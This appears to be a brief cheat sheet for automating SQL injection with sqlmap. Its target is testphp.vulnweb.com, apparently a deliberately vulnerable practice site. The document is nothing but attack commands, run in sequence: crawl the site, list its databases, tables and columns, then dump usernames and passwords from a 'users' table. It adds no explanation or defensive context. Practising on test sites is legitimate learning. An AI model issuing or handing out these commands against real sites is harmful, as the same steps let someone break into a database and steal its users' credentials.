## Sql Injection automation

Target Domain http://testphp.vulnweb.com

Crawling

    sqlmap -u "http://testphp.vulnweb.com" --crawl=2 -v --random-agent --batch -o crawl.txt

All DBMS name

    sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -dbs -v --random-agent --batch -o dbs.txt

Dump Full Table

    sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables -v --random-agent --batch -o table.txt

Dump Full Column

    sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --columns -v --random-agent --batch -o columns.txt

Dump Column data

    sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users -C uname,pass --dump -v --random-agent --batch -o dump-dbs-data.txt
